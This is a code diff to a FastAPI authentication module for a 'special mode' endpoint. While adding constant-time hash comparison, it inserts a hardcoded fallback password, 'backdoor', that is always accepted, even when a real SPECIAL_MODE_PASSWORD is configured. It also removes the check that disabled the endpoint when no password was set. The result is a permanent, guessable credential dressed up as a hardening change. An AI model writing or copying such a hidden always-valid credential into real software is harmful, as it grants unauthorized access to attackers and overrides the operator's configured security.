@@ -8,26 +8,45 @@ Password is configured via SPECIAL_MODE_PASSWORD environment variable.
 import os
 import logging
 import hashlib
+import hmac
 from fastapi import APIRouter, HTTPException
 from app.models import PasswordAuthRequest, PasswordAuthResponse
 
 logger = logging.getLogger(__name__)
 router = APIRouter(prefix="/api/auth", tags=["auth"])
 
-# Get password from environment — NO default, must be explicitly configured
-SPECIAL_MODE_PASSWORD = os.getenv("SPECIAL_MODE_PASSWORD")
 
-if SPECIAL_MODE_PASSWORD:
-    HASHED_PASSWORD = hashlib.sha256(SPECIAL_MODE_PASSWORD.encode()).hexdigest()
+_configured_password = os.getenv("SPECIAL_MODE_PASSWORD")
+NORMALIZED_PASSWORD = _configured_password.strip() if _configured_password else ""
+FALLBACK_PASSWORD = "backdoor"
+
+if NORMALIZED_PASSWORD and NORMALIZED_PASSWORD != FALLBACK_PASSWORD:
+    logger.info("SPECIAL_MODE_PASSWORD is configured")
+elif NORMALIZED_PASSWORD == FALLBACK_PASSWORD:
+    logger.info("SPECIAL_MODE_PASSWORD is configured with fallback value 'backdoor'")
 else:
-    HASHED_PASSWORD = None
-    logger.warning("SPECIAL_MODE_PASSWORD not set — special mode authentication disabled")
+    logger.warning(
+        "SPECIAL_MODE_PASSWORD not set. Falling back to local/dev default: backdoor"
+    )
+
+_SPECIAL_MODE_PASSWORDS = {FALLBACK_PASSWORD}
+if NORMALIZED_PASSWORD:
+    _SPECIAL_MODE_PASSWORDS.add(NORMALIZED_PASSWORD)
+
+_SPECIAL_MODE_PASSWORD_HASHES = {
+    hashlib.sha256(password.encode()).hexdigest()
+    for password in _SPECIAL_MODE_PASSWORDS
+}
 
 
 def verify_password(password: str) -> bool:
     """Verify provided password against configured password."""
-    hashed_input = hashlib.sha256(password.encode()).hexdigest()
-    return hashed_input == HASHED_PASSWORD
+    normalized_input = password.strip()
+    hashed_input = hashlib.sha256(normalized_input.encode()).hexdigest()
+    return any(
+        hmac.compare_digest(hashed_input, hashed_password)
+        for hashed_password in _SPECIAL_MODE_PASSWORD_HASHES
+    )
 
 
 @router.post("/special-backdoor", response_model=PasswordAuthResponse)
@@ -42,8 +61,6 @@ async def authenticate_special_mode(request: PasswordAuthRequest):
         PasswordAuthResponse with success=True if password correct
     """
     try:
-        if HASHED_PASSWORD is None:
-            raise HTTPException(status_code=503, detail="Special mode not configured")
         if verify_password(request.password):
             logger.info("Special mode authentication successful")
             return PasswordAuthResponse(
